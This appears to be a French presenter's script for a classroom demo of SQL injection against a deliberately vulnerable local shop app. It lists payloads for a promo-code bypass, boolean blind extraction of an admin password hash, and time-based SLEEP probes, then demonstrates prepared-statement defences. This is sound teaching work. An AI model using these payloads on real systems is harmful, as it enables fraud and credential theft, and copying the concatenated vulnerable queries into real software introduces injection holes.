 ACTE 3 — "LES ATTAQUES INVISIBLES"  (~7 min)
════════════════════════════════════════════════════════════════

────────────────────────────────────────────────────────────────
 VULN #10 — Bypass + Boolean blind (codes promo)
 URL : http://localhost/shopcm/pages/promo.php
 CODE SOURCE :
   ⚠️ Vulnérable : pages/promo.php  — ligne 34
                   $query = "SELECT * FROM codes_promo WHERE code = '$code' AND actif = 1..."
   ✅ Sécurisé   : pages/promo.php  — ligne 45
                   $stmt = $pdo->prepare("SELECT * FROM codes_promo WHERE code = ? AND actif = 1...")
────────────────────────────────────────────────────────────────

 ── PARTIE A : BYPASS (code fictif rendu valide) ────────────────

 ÉTAPE 0 — Taper un code qui n'existe PAS dans la base :
   Code →  CODECADEAU
   Résultat : ❌ Code invalide  ← confirmation que le code est faux

 ÉTAPE 0b — Même code fictif avec injection OR :
   Code →  CODECADEAU' OR '1'='1'-- -
   Résultat : ✅ Code valide ! Réduction : 20%  ← BYPASS !

 Requête SQL générée (visible dans l'encart) :
   SELECT * FROM codes_promo WHERE code = 'CODECADEAU' OR '1'='1'-- -'
                                   AND actif = 1 AND date_expiration >= CURDATE()
 → '1'='1' est toujours vrai → retourne le premier code en base
 → le site accorde une réduction sur un code qui n'existe pas !

 ── PARTIE B : BOOLEAN BLIND (extraction silencieuse) ───────────

 ÉTAPE 1 — Confirmer que le code NOEL2025 existe :
   Code →  NOEL2025
   Résultat : ✅ Code valide ! Réduction : 20%

 ÉTAPE 2 — Condition vraie (1=1) :
   Code →  NOEL2025' AND 1=1-- -
   Résultat : ✅ Code valide !  ← la condition est vraie

 ÉTAPE 3 — Condition fausse (1=2) :
   Code →  NOEL2025' AND 1=2-- -
   Résultat : ❌ Code invalide  ← la condition est fausse

 ÉTAPE 4 — Exfiltration : premier caractère du hash admin :
   Code →  NOEL2025' AND SUBSTRING((SELECT password FROM admins LIMIT 1),1,1)='$'-- -
   Résultat : ✅ Code valide !  ← bcrypt commence toujours par $

 Explication : en répétant l'étape 4 avec chaque caractère,
               on reconstitue le hash complet (~60 requêtes)


────────────────────────────────────────────────────────────────
 VULN #9 — Time-based blind (suivi commande)
 URL : http://localhost/shopcm/pages/suivi.php
 CODE SOURCE :
   ⚠️ Vulnérable : pages/suivi.php  — ligne 43
                   $query = "SELECT * FROM commandes WHERE numero_suivi = '$numero'"
   ✅ Sécurisé   : pages/suivi.php  — ligne 55

────────────────────────────────────────────────────────────────

 Numéro normal (rapide) :
   SHOP-2025-0001
   → réponse en ~3ms

 Payload avec SLEEP (lent) :

 Montrer : le site semble normal mais quelque chose se passe
           en coulisse — le temps de réponse le trahit

════════════════════════════════════════════════════════════════
 CONCLUSION — "LA DÉFENSE"  (~10 min)
════════════════════════════════════════════════════════════════

 ÉTAPE 1 : Cliquer sur "Basculer en mode SÉCURISÉ"
           → le badge passe au vert 🛡️

 ÉTAPE 2 : Relancer exactement les mêmes payloads :

   Vuln #7  : ' OR 1=1-- -            → "Email ou mot de passe incorrect."
   Vuln #11 : admin' OR '1'='1'-- -   → "Identifiants incorrects."
   Vuln #1  : %' UNION SELECT...      → 0 résultat
   Vuln #5  : id=-1 UNION SELECT...   → "Produit introuvable."
   Vuln #9  : SLEEP(5)                → réponse en ~3ms (SLEEP ignoré)
   Vuln #10 : NOEL2025' AND 1=1-- -   → "Code invalide."

 ÉTAPE 3 : Montrer l'encart SQL en mode sécurisé :
   → La requête affiche des "?" à la place des valeurs
   → Les "Paramètres liés" sont affichés séparément
   → L'injection est transmise comme TEXTE, pas comme SQL

 ÉTAPE 4 : Les 4 piliers de la défense :

   1. REQUÊTES PRÉPARÉES  → PDO prepare() + execute()
      Protection : séparation stricte code SQL / données

   2. WHITELIST            → ORDER BY seulement sur [nom, prix, stock]
      Protection : valider que l'entrée fait partie d'une liste autorisée

   3. MOINDRE PRIVILÈGE    → utilisateur MySQL avec droits limités
      Protection : même si injection, pas de DROP/CREATE/FILE

   4. VALIDATION DE TYPE   → (int)$id, (float)$min
      Protection : forcer le type attendu avant d'utiliser la valeur

 EN CAS DE PROBLÈME
════════════════════════════════════════════════════════════════

 Base de données vide ou erreur de connexion :
   → Réimporter sql/shopcm_db.sql dans phpMyAdmin

 Le toggle ne fonctionne pas :
   → Vider les cookies du navigateur et recharger

 SLEEP(5) ne produit pas de délai en mode sécurisé :
   → C'est normal ! C'est exactement ce qu'on veut montrer

 Le curl de la Vuln #12 retourne "403 Forbidden" :
   → Se connecter d'abord en admin via le navigateur
     (la session cookie n'est pas transmise par curl)
   → Solution démo : désactiver temporairement la vérif session
     dans admin/logs.php pour la démo (ligne 20-23)

 Les images ne s'affichent pas :
   → Vérifier que assets/images/*.jpg existent
   → L'attribut onerror affiche placeholder.jpg en fallback
